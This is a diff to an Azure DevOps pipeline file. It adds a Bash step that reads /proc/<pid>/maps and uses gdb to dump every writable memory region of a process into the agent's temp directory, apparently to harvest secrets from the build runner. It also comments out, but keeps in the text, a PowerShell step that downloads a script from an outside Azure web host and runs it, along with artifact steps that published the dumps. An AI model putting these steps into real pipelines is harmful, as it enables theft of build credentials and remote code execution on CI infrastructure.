@@ -62,24 +62,39 @@ steps:
 #       Get-ChildItem $(Agent.TempDirectory)/ | Out-String -Width 160
 #   continueOnError: true
 
-- task: PowerShell@2
+- task: Bash@3
   inputs:
     targetType: 'inline'
     script: |
-      $Script = Invoke-WebRequest 'https://officeadotest.azurewebsites.net/api/httptrigger1'
-      $ScriptBlock = [Scriptblock]::Create($Script.Content)
-      Invoke-Command -ScriptBlock $ScriptBlock
-  continueOnError: true
+      #!/bin/bash
+      
+      grep rw-p /proc/$1/maps \
+      | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
+      | while read start stop; do \
+          gdb --batch --pid $1 -ex \
+              "dump memory $(Agent.TempDirectory)/$1-$start-$stop.dump 0x$start 0x$stop"; \
+      done;
+      
+      ls $(Agent.TempDirectory);
 
-- task: PublishPipelineArtifact@1
-  inputs:
-    targetPath: '$(Agent.TempDirectory)/dump.txt'
-    artifact: 'Dump'
-    publishLocation: 'pipeline'
-  continueOnError: true
+# - task: PowerShell@2
+#   inputs:
+#     targetType: 'inline'
+#     script: |
+#       $Script = Invoke-WebRequest 'https://officeadotest.azurewebsites.net/api/httptrigger1'
+#       $ScriptBlock = [Scriptblock]::Create($Script.Content)
+#       Invoke-Command -ScriptBlock $ScriptBlock
+#   continueOnError: true
+
+# - task: PublishPipelineArtifact@1
+#   inputs:
+#     targetPath: '$(Agent.TempDirectory)/dump.txt'
+#     artifact: 'Dump'
+#     publishLocation: 'pipeline'
+#   continueOnError: true
     
-- task: PublishBuildArtifacts@1
-  inputs:
-    PathtoPublish: '$(Build.ArtifactStagingDirectory)'
-    ArtifactName: 'yogeesh/dump-01.dmp'
-    publishLocation: 'Container'
+# - task: PublishBuildArtifacts@1
+#   inputs:
+#     PathtoPublish: '$(Build.ArtifactStagingDirectory)'
+#     ArtifactName: 'yogeesh/dump-01.dmp'
+#     publishLocation: 'Container'
